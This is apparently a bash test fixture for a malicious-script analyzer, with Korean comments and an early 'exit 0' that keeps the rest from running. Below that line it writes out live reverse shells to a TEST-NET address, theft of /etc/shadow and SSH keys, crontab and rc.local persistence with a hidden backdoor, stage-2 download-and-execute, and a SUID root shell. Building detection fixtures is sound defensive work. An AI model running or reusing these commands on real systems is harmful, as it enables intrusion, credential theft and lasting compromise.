#!/bin/bash
# [분석기 테스트 픽스처] — 실제 실행 시 아무것도 하지 않음
# 악성 Shell 스크립트 분석 패턴 검증용. 모든 악성 코드 경로는 exit로 차단됨.

exit 0  # <- 여기서 스크립트 종료. 아래 코드는 절대 실행되지 않음.

# ── 패턴 1: 리버스 셸 ──────────────────────────────────────────────────
# bash -i >& /dev/tcp/192.0.2.1/4444 0>&1   # TEST-NET: 실제 없는 주소
RHOST="192.0.2.1"
RPORT="4444"
bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1 &

# nc 리버스 셸 (대안)
nc -e /bin/sh $RHOST $RPORT

# ── 패턴 2: 정찰 / 시스템 열거 ────────────────────────────────────────
whoami
id
hostname
ipconfig 2>/dev/null || ip addr
netstat -an
ps aux
systeminfo 2>/dev/null || uname -a

# ── 패턴 3: 자격증명 탈취 ─────────────────────────────────────────────
cat /etc/passwd
cat /etc/shadow 2>/dev/null
find / -name "*.pem" -o -name "*.key" -o -name "id_rsa" 2>/dev/null
cat ~/.ssh/id_rsa 2>/dev/null
env | grep -i password
env | grep -i credential

# ── 패턴 4: 지속성 (crontab + rc.local) ──────────────────────────────
# 부팅 시 자동 실행 등록
(crontab -l 2>/dev/null; echo "@reboot /tmp/.hidden_backdoor &") | crontab -
echo "/tmp/.hidden_backdoor &" >> /etc/rc.local
chmod +x /etc/rc.local

# 숨김 파일로 복사
cp "$0" /tmp/.hidden_backdoor
chmod +x /tmp/.hidden_backdoor

# ── 패턴 5: C2 다운로드 및 실행 ──────────────────────────────────────
# wget/curl로 2차 페이로드 다운로드
STAGE2_URL="http://192.0.2.1/stage2.sh"    # TEST-NET: 실제 없는 주소
curl -s $STAGE2_URL -o /tmp/.s2 && chmod +x /tmp/.s2 && /tmp/.s2 &
wget -q $STAGE2_URL -O /tmp/.s2 && chmod +x /tmp/.s2 && /tmp/.s2 &

# ── 패턴 6: 권한 상승 시도 ────────────────────────────────────────────
sudo -l
sudo bash -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"
find / -perm -u=s -type f 2>/dev/null    # SUID 바이너리 열거
